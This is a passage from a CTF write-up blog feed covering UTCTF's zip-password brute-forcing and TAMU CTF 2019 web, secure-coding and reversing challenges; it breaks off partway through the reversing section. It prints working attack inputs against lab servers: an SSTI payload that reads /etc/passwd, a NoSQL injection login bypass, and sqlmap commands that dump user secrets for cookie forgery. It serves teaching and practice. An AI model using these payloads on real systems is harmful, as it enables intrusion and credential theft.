<strong>problem.txt</strong> which was provided to us. Also it was the same regex which was in the challenge description.<br>We were also given a zip which was obviously encrypted and we had to decrypt by brute-forcing it against some words that satisfy the regex.</p><p>I quickly used my google foo skills to search for a Regex library which can be used with python to generate those words. </p><p>Oh there’s a perfect library for our work =&gt; <strong>exrex</strong>  </p><p>Install it using :</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install exrex</span><br></pre></td></tr></table></figure><p>And I shooted Sublime to make a wordlist and brute-force at the same time using python  :</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> exrex</span><br><span class="line"><span class="keyword">import</span> zipfile </span><br><span class="line"> </span><br><span class="line">encZip = <span class="string">&#x27;RegularZips.zip&#x27;</span> </span><br><span class="line">wordlist = <span class="built_in">open</span>(<span class="string">&#x27;wordlist.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">wordlist.write(<span class="string">&#x27;\n&#x27;</span>.join(<span class="built_in">list</span>(exrex.generate(<span class="string">&quot;^7yRU[A-Z]KKx2 R4\d[a-z]BN$&quot;</span>))))</span><br><span class="line"></span><br><span class="line">password = <span class="literal">None</span> </span><br><span class="line">zf = zipfile.ZipFile(encZip) </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;wordlist.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f: </span><br><span class="line">   <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines(): </span><br><span class="line">         password = line.strip(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">         <span class="keyword">try</span>: </span><br><span class="line">               zf.extractall(pwd=password) </span><br><span class="line">               password = <span class="string">&#x27;Password found: %s&#x27;</span> % password </span><br><span class="line">               <span class="built_in">print</span> password</span><br><span class="line">         <span class="keyword">except</span>: </span><br><span class="line">               <span class="keyword">pass</span> </span><br></pre></td></tr></table></figure><p>And we got our password…<br>But Be careful with spaces and tabs !!</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Password found: 7yRUHKKx2 R47gBN</span><br></pre></td></tr></table></figure><p>But that’s not enough, we have a long journey ahead. lols..  </p><p><a href="/img/utctf/archive.png" class="gallery-item"><img src="/img/utctf/archive.png"></a></p><p>So after extracting it we get another zipfile as <strong>archive.zip</strong> and a <strong>hint.txt</strong> file which contains another regex sadly.<br>So we can just write a script to extract all of the archives until we are left with none of them. I used <strong>zipfile</strong> library in python to workaround with zip files in python and added some colors to make the automation process more fun.  </p><p>I created a new directory and placed this script along with RegularZips.zip and Problem.txt.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> exrex</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RED = <span class="keyword">lambda</span> x: <span class="string">&#x27;\033[31m&#x27;</span> + <span class="built_in">str</span>(x)</span><br><span class="line">RESET = <span class="keyword">lambda</span> x: <span class="string">&#x27;\033[0m&#x27;</span> + <span class="built_in">str</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tryunzip</span>(<span class="params">file, hint</span>):</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(file) <span class="keyword">as</span> z:</span><br><span class="line">        <span class="keyword">for</span> pwd <span class="keyword">in</span> exrex.generate(hint, limit=exrex.count(hint)):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                z.extractall(pwd=pwd.encode())</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;Password Found : &quot;</span>,</span><br><span class="line">                <span class="built_in">print</span> RED(pwd)</span><br><span class="line">                <span class="built_in">print</span> RESET(<span class="string">&#x27; &#x27;</span>) </span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;flag.txt&quot;</span> <span class="keyword">in</span> z.namelist():</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&quot;---- Flag Found ----&quot;</span></span><br><span class="line">                    os.system(<span class="string">&#x27;cat flag.txt&#x27;</span>) </span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    tryunzip(<span class="string">&#x27;RegularZips.zip&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;problem.txt&#x27;</span>).read()[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> os.path.exists(<span class="string">&#x27;archive.zip&#x27;</span>):</span><br><span class="line">        os.rename(<span class="string">&#x27;archive.zip&#x27;</span>, <span class="string">&#x27;archive&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.zip&#x27;</span>)</span><br><span class="line">        tryunzip(<span class="string">&#x27;archive&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.zip&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;hint.txt&#x27;</span>).read()[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Currently Processing : archive&quot;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        os.remove(<span class="string">&#x27;archive&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.zip&#x27;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>And To our Surprise …<br>There was a flag.txt in <strong>archive998</strong>.</p><p><a href="/img/utctf/flag.png" class="gallery-item"><img src="/img/utctf/flag.png"></a></p><p>The Flag was : </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;bean_pure_omission_production_rally&#125;</span><br></pre></td></tr></table></figure><p>Wasn’t it Sw33t. </p><p>Don’t hesitate to leave a feedback in the comments section and Subscribe if you want to stay updated with other CTF’s writeups and walkthroughs. </p><p>Keep Waiting for my next writeup.<br>Till then Keep Escalating the Priveleges and Happy Hacking !!</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/CTF-Writeups/">CTF Writeups</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/utctf/">utctf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/regularzips/">regularzips</category>
      
      
      <comments>https://mrt4ntr4.github.io/UTCTF-RegularZips-Writeup/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>TAMU CTF 2019</title>
      <link>https://mrt4ntr4.github.io/Tamu-CTF-Writeups/</link>
      <guid>https://mrt4ntr4.github.io/Tamu-CTF-Writeups/</guid>
      <pubDate>Sun, 03 Mar 2019 22:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/tamu/tamuThumb.png" title="banner" class="gallery-item"><img src="/img/tamu/tamuThumb.png" alt="banner"></a></p><p>TamuCTF 2019 had some pretty good challenges which actually forced you to learn things. It was a 9 days long CTF, and I personally felt it somewhat boring too as all the challenges were disclosed in the beginning. I also at some point found it fun to solve some challenges from SeasidesCTF 2019 and I left Tamu for 2-3 days. </p><p>This Post includes the writeup to the following Challenges.</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p><a href="#science1">Science 1</a><br><a href="#buckets">Buckets</a><br><a href="#loginapp">Login App</a><br><a href="#1337secur1ty">1337 Secur1ty</a>  </p><h3 id="Secure-Coding"><a href="#Secure-Coding" class="headerlink" title="Secure Coding"></a>Secure Coding</h3><p><a href="#sql">SQL</a><br><a href="#pwn">PWN</a><br><a href="#science2">Science 2</a><br><a href="#loginapp2">Login App 2</a></p><h3 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h3><p><a href="#keygenme">KeyGenMe</a><br><a href="#noccbytes">NoCCBytes</a><br><a href="#cr4ckz33c0d3">Cr4ckZ33C0d3</a></p><p>Ok lets get our hands dirty !! in the Binary World. XD</p><hr><hr><h1 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h1><h2 id="Science1"><a href="#Science1" class="headerlink" title="Science1"></a>Science1</h2><p><a href="/img/tamu/science!Thumb.png" class="gallery-item"><img src="/img/tamu/science!Thumb.png"></a></p><p>After navigating to the web address, I observe the hint <strong>(Flask as a Service)</strong>.<br>The first thing to check with sites made with Flask is <em>SSTI(Server Side Template Injection)</em>.<br>You can read more about it <a href="https://www.netsparker.com/blog/web-security/server-side-template-injection">here</a>.<br><a href="/img/tamu/science/1.png" class="gallery-item"><img src="/img/tamu/science/1.png"></a>  </p><p>Here I got to know that the inputs are reflecting in the output.<br><a href="/img/tamu/science/2.png" class="gallery-item"><img src="/img/tamu/science/2.png"></a>  </p><p> Once XSS also came to mind and it was also vulnerable to it but as mentioned, lets exploit it using Flask.<br> I quickly intercepted the POST Request and tried </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%raw%&#125;</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;%endraw%&#125;</span><br></pre></td></tr></table></figure><p>  in chem1 input field.<br> And to my surprise it was vulnerable.  </p><p><a href="/img/tamu/science/3.png" class="gallery-item"><img src="/img/tamu/science/3.png"></a></p><p><a href="/img/tamu/science/4.png" class="gallery-item"><img src="/img/tamu/science/4.png"></a>  </p><p>Then I tried some payloads from this <a href="https://www.we45.com/blog/server-side-template-injection-a-crash-course-">site</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%raw%&#125;</span><br><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;%endraw%&#125;</span><br></pre></td></tr></table></figure><p><a href="/img/tamu/science/5.png" class="gallery-item"><img src="/img/tamu/science/5.png"></a></p><p>It shows us the <strong>/etc/passwd</strong> dir.  </p><p><a href="/img/tamu/science/6.png" class="gallery-item"><img src="/img/tamu/science/6.png"></a></p><p>Now its a clear path if you know the right directory where the flag is stored.  </p><p><a href="/img/tamu/science/7.png" class="gallery-item"><img src="/img/tamu/science/7.png"></a></p><p>After some brute-forcing I found the directory as <strong>/opt/tamuctf/</strong>.</p><p><a href="/img/tamu/science/8.png" class="gallery-item"><img src="/img/tamu/science/8.png"></a></p><hr><h2 id="Buckets"><a href="#Buckets" class="headerlink" title="Buckets"></a>Buckets</h2><p><a href="/img/tamu/bucketsThumb.png" class="gallery-item"><img src="/img/tamu/bucketsThumb.png"></a></p><p>This challenge was very easy who knew something about how aws works.<br>If you have solved flaws.cloud or read some of it’s walkthroughs, then this challenge is a cakewalk.</p><p>So just tinkering around a bit…<br><a href="/img/tamu/buckets/1.png" class="gallery-item"><img src="/img/tamu/buckets/1.png"></a></p><p>We can’t leave the source alone .. haha</p><p><a href="/img/tamu/buckets/2.png" class="gallery-item"><img src="/img/tamu/buckets/2.png"></a></p><p>So both the Source and original page gives us a hint for <strong>DOGS</strong></p><p>We have to simply modify the url given to us for the challenge to get a tree of keys.</p><p><a href="/img/tamu/buckets/3.png" class="gallery-item"><img src="/img/tamu/buckets/3.png"></a></p><p>And if we follow our hint, flag can’t be missed.</p><p><a href="/img/tamu/buckets/4.png" class="gallery-item"><img src="/img/tamu/buckets/4.png"></a></p><hr><h2 id="LoginApp"><a href="#LoginApp" class="headerlink" title="LoginApp"></a>LoginApp</h2><p><a href="/img/tamu/loginappThumb.png" class="gallery-item"><img src="/img/tamu/loginappThumb.png"></a>  </p><p>FYI : This was hell of a challenge for me.<br>So, we head over to the given link, and it is a simple login page.  </p><p><a href="/img/tamu/login/1.png" class="gallery-item"><img src="/img/tamu/login/1.png"></a>  </p><p>After going through the source, I also found a <strong>Register-Form</strong> which was hidden.</p><p><a href="/img/tamu/login/2.png" class="gallery-item"><img src="/img/tamu/login/2.png"></a>  </p><p>We can modify the display statement to the following using Dev Tools in our browser :</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">display</span>: <span class="selector-tag">block</span>;</span><br></pre></td></tr></table></figure><p>We see a beatiful Create and Login form side by side.  </p><p><a href="/img/tamu/login/3.png" class="gallery-item"><img src="/img/tamu/login/3.png"></a>  </p><p>Then I used Burpsuite to intercept the CREATE request and saw that it was pointing to nothing. And also there was no source code available for the Register form submit button to POST some JSON data as in the case of Login Button. And then I closed this challenge for like 2 days.<br>Fortunately, when I began to solve it with a fresh mind I was able to succeed though. </p><p>Now I began trying some SQL Payloads at first and then I was lucky that I tried NoSQL at last though.    </p><p>I tried some payloads from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20injection"  target="_blank">here</a> on the login page.</p><p>The following worked for me :</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;username&quot;</span>: &#123;<span class="attr">&quot;$ne&quot;</span>: <span class="string">&quot;foo&quot;</span>&#125;, <span class="attr">&quot;password&quot;</span>: &#123;<span class="attr">&quot;$ne&quot;</span>: <span class="string">&quot;bar&quot;</span>&#125; &#125;</span><br></pre></td></tr></table></figure><p><a href="/img/tamu/login/4.png" class="gallery-item"><img src="/img/tamu/login/4.png"></a>  </p><p>And I was just mad now to know that it really worked and we were logged in as a user named <strong>bob</strong>.<br><a href="/img/tamu/login/5.png" class="gallery-item"><img src="/img/tamu/login/5.png"></a> </p><p>But out motive is to find the flag.. ryt.<br>So I simply changed the Username Value to the following:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;username&quot;: &#123;&quot;$ne&quot;: &quot;bob&quot;&#125;,</span><br></pre></td></tr></table></figure><p><a href="/img/tamu/login/6.png" class="gallery-item"><img src="/img/tamu/login/6.png"></a>  </p><p>and BoomYa!!</p><p><a href="/img/tamu/login/7.png" class="gallery-item"><img src="/img/tamu/login/7.png"></a>  </p><hr><h2 id="1337Secur1ty"><a href="#1337Secur1ty" class="headerlink" title="1337Secur1ty"></a>1337Secur1ty</h2><p><a href="/img/tamu/1337Thumb.png" class="gallery-item"><img src="/img/tamu/1337Thumb.png"></a></p><p>Spoiler:<br>This challenge was pretty ez pz if you used sqlmap like me.<br>And also if you have found the right path. XD</p><p>The link takes us to a Company’s (1337 Secur1ty) website where we are presented with a login page and a registration at first..<br>After registering with some random id, I got in and began tinkering with how did the site work, what features does it provide, etc.</p><p><a href="/img/tamu/1337/1.png" class="gallery-item"><img src="/img/tamu/1337/1.png"></a></p><p>There was an <strong>Employees Section</strong> which displayed the registered users.</p><p><a href="/img/tamu/1337/2.png" class="gallery-item"><img src="/img/tamu/1337/2.png"></a></p><p>Also the most interesting was the <strong>Message Section</strong>.<br><a href="/img/tamu/1337/3.png" class="gallery-item"><img src="/img/tamu/1337/3.png"></a></p><p>I tried simple XSS first.</p><p><a href="/img/tamu/1337/4.png" class="gallery-item"><img src="/img/tamu/1337/4.png"></a></p><p>But with no luck, it was not vulnerable, as the challenge difficulty level specified <strong>hard</strong>. ;D </p><p>But at the same time i observed that the id can be changed in the URL and this led me to think that SQLi might be the right thing to try here.<br><a href="/img/tamu/1337/5.png" class="gallery-item"><img src="/img/tamu/1337/5.png"></a></p><p>Also when I checked the cookies, there was a cookie named as <strong>secret</strong>.<br>And obviously the <strong>userid</strong>.<br>Till now we know that the admin has the <strong>userid = 1</strong> by referring to the Employees Section.</p><p><a href="/img/tamu/1337/6.png" class="gallery-item"><img src="/img/tamu/1337/6.png"></a></p><p>I fired up my favorite tool ie. SqlMap and used : </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://web6.tamuctf.com/message?id=6  --dbs</span><br></pre></td></tr></table></figure><p>To guess the back-end DBMS and database names.<br><a href="/img/tamu/1337/7.png" class="gallery-item"><img src="/img/tamu/1337/7.png"></a></p><p>Afterwards we can check for columns.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://web6.tamuctf.com/message?id=6  --dump</span><br></pre></td></tr></table></figure><p><a href="/img/tamu/1337/8.png" class="gallery-item"><img src="/img/tamu/1337/8.png"></a></p><p>And at last we can dump the value of secret along with its UserID.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://web6.tamuctf.com/message?id=6  -D 1337_Secur1ty -T Users -C UserID,Secret --dump</span><br></pre></td></tr></table></figure><p><a href="/img/tamu/1337/9.png" class="gallery-item"><img src="/img/tamu/1337/9.png"></a></p><p>Now, we have got everything.<br>We just need to change our Secret and UserID cookie in BurpSuite Repeater.</p><p><a href="/img/tamu/1337/10.png" class="gallery-item"><img src="/img/tamu/1337/10.png"></a></p><p>Aww our flag was waiting for us …</p><p><a href="/img/tamu/1337/11.png" class="gallery-item"><img src="/img/tamu/1337/11.png"></a></p><p>Finally solved !!   </p><p><a href="https://media.giphy.com/media/xsMJyTdf4BQKk/giphy.gif" class="gallery-item"><img src="https://media.giphy.com/media/xsMJyTdf4BQKk/giphy.gif"></a></p><p>BTW we can also use EditThisCookie Extension in our browser to change cookie and or We can forward the request as well with request to see the Rendered Page.</p><p><a href="/img/tamu/1337/12.png" class="gallery-item"><img src="/img/tamu/1337/12.png"></a></p><hr><hr><h1 id="Secure-Coding-1"><a href="#Secure-Coding-1" class="headerlink" title="Secure Coding"></a>Secure Coding</h1><h3 id="Universal-Instruction"><a href="#Universal-Instruction" class="headerlink" title="Universal Instruction"></a>Universal Instruction</h3><p>To solve this challenge you must first fork the challenge and then modify the files in this repository and attempt to fix the vulnerability that you found.<br>Everytime you make a commit your files are tested on the backend system. The results can be found under CI/CD-&gt;Jobs and then the last test ran.<br>If you pass all of the tests the flag will be printed at the bottom of the CI/CD display. Otherwise you will either get an error or statement saying what happened.</p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p><em>Now that you have broken the SQL Injection challenge it’s your turn to fix it!</em>   </p><p><a href="/files/tamu/login.php"  target="_blank">Unsecure Code(login.php)</a></p><h4 id="Replace"><a href="#Replace" class="headerlink" title="Replace :"></a>Replace :</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br></pre></td></tr></table></figure><h4 id="With"><a href="#With" class="headerlink" title="With :"></a>With :</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = filter_var(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], FILTER_SANITIZE_STRING);</span><br><span class="line"><span class="variable">$pass</span> = filter_var(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], FILTER_SANITIZE_STRING);</span><br></pre></td></tr></table></figure><p><a href="https://www.johnmorrisonline.com/validate-sanitize-user-input-php-using-filter_input-filter_var/"  target="_blank">Reference</a></p><p><a href="/img/tamu/sc/sql.png" class="gallery-item"><img src="/img/tamu/sc/sql.png"></a></p><hr><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p><em>Now that you have broken a PWN challenge it’s your turn to fix it!</em></p><p><a href="/files/tamu/PWN.c" target="_blank">Unsecure Code(PWN.c)</a></p><h4 id="Replace-1"><a href="#Replace-1" class="headerlink" title="Replace :"></a>Replace :</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    gets(buf);</span><br><span class="line">```  </span><br><span class="line">#### With :</span><br><span class="line">```c</span><br><span class="line">    fgets(buf,<span class="number">128</span>,<span class="built_in">stdin</span>);</span><br></pre></td></tr></table></figure><p><a href="http://web.mit.edu/6.s096/www/lecture/lecture03/secure-C.pdf"  target="_blank">Reference</a></p><p><a href="/img/tamu/sc/pwn.png" class="gallery-item"><img src="/img/tamu/sc/pwn.png"></a></p><hr><h2 id="Science2"><a href="#Science2" class="headerlink" title="Science2"></a>Science2</h2><p><em>Now that you have broken the Jinja2 Template Injection challenge it’s your turn to fix it!</em></p><p><a href="/files/tamu/views.py"  target="_blank">Unsecure Code(views.py)</a></p><h4 id="Replace-2"><a href="#Replace-2" class="headerlink" title="Replace :"></a>Replace :</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chem1 = request.form[<span class="string">&#x27;chem1&#x27;</span>]</span><br><span class="line">chem2 = request.form[<span class="string">&#x27;chem2&#x27;</span>]</span><br></pre></td></tr></table></figure><h4 id="With-1"><a href="#With-1" class="headerlink" title="With:"></a>With:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%raw%&#125;</span><br><span class="line">        chem1 = request.form[<span class="string">&#x27;chem1&#x27;</span>].replace(<span class="string">&quot;&#123;&#123;&quot;</span>,<span class="string">&quot;\&#x27;&#123;&#123;\&#x27;&quot;</span>).replace(<span class="string">&quot;&#125;&#125;&quot;</span>,<span class="string">&quot;\&#x27;&#125;&#125;\&#x27;&quot;</span>)</span><br><span class="line">        chem2 = request.form[<span class="string">&#x27;chem2&#x27;</span>].replace(<span class="string">&quot;&#123;&#123;&quot;</span>,<span class="string">&quot;\&#x27;&#123;&#123;\&#x27;&quot;</span>).replace(<span class="string">&quot;&#125;&#125;&quot;</span>,<span class="string">&quot;\&#x27;&#125;&#125;\&#x27;&quot;</span>)&#123;%endraw%&#125;</span><br></pre></td></tr></table></figure><p><a href="https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html"  target="_blank">Reference</a></p><p><a href="/img/tamu/sc/science.png" class="gallery-item"><img src="/img/tamu/sc/science.png"></a></p><hr><h2 id="LoginApp2"><a href="#LoginApp2" class="headerlink" title="LoginApp2"></a>LoginApp2</h2><p><em>Now that you have broken the NoSQL Injection challenge it’s your turn to fix it!</em></p><p><a href="/files/tamu/server.js"  target="_blank">Unsecure Code(server.js)</a></p><h4 id="Replace-3"><a href="#Replace-3" class="headerlink" title="Replace :"></a>Replace :</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> query = &#123;</span><br><span class="line">    username: sanitize(req.body.username),</span><br><span class="line">    password: sanitize(req.body.password)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.collection(<span class="string">&#x27;users&#x27;</span>).findOne(query, <span class="function"><span class="keyword">function</span> (<span class="params">err, user</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(user == <span class="literal">null</span>) &#123;</span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(<span class="string">&quot;Login Failed&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        resp = <span class="string">&quot;Welcome: &quot;</span> + user[<span class="string">&#x27;username&#x27;</span>] + <span class="string">&quot;!&quot;</span>;</span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(resp));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="With-2"><a href="#With-2" class="headerlink" title="With :"></a>With :</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var username &#x3D; req.body.username;</span><br><span class="line">var password &#x3D; req.body.password;</span><br><span class="line"></span><br><span class="line">c.collection(&#39;users&#39;).findOne(&#123;&#39;username&#39;: &#123; $in: [username] &#125;,&#39;password&#39;: &#123; $in: [password] &#125;&#125;, function (err, user) &#123;</span><br><span class="line">    if(err)&#123;</span><br><span class="line">        res.send(JSON.stringify(&quot;Login Failed&quot;));</span><br><span class="line">    &#125;else if(user)&#123;</span><br><span class="line">        resp &#x3D; &quot;Welcome: &quot; + user[&#39;username&#39;] + &quot;!&quot;;</span><br><span class="line">        res.send(JSON.stringify(resp));</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        res.send(JSON.stringify(&quot;Login Failed&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;); </span><br></pre></td></tr></table></figure><p><a href="https://scotch.io/@401/mongodb-injection-in-nodejs"  target="_blank">Reference</a></p><p><a href="/img/tamu/sc/loginapp2.png" class="gallery-item"><img src="/img/tamu/sc/loginapp2.png"></a></p><hr><hr><h1 id="Reversing-1"><a href="#Reversing-1" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="KeyGenMe"><a href="#KeyGenMe" class="headerlink" title="KeyGenMe"></a>KeyGenMe</h2><p><a href="/img/tamu/keygenmeThumb.png" class="gallery-item"><img src="/img/tamu/keygenmeThumb.png"></a></p><p><a href="/files/tamu/keygenme"  target="_blank">Download File</a></p><p>About This Challenge I’d only tell that I learnt the most from it tho.</p><p>Going through basic assembly of the main function I found that it was calling another function named as <strong>verify_key</strong>.<br><a href="/img/tamu/keygenme/1.PNG" class="gallery-item"><img src="/img/tamu/keygenme/1.PNG"></a></p><p>And later focusing on <strong>verify_key</strong>, I observe that it was calling <strong>enc()</strong> and then comparing our input string to some weird encrypted text.  </p><p><a href="/img/tamu/keygenme/2.PNG" class="gallery-item"><img src="/img/tamu/keygenme/2.PNG"></a></p><p>Pseudocode (<strong>enc()</strong>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">enc</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> 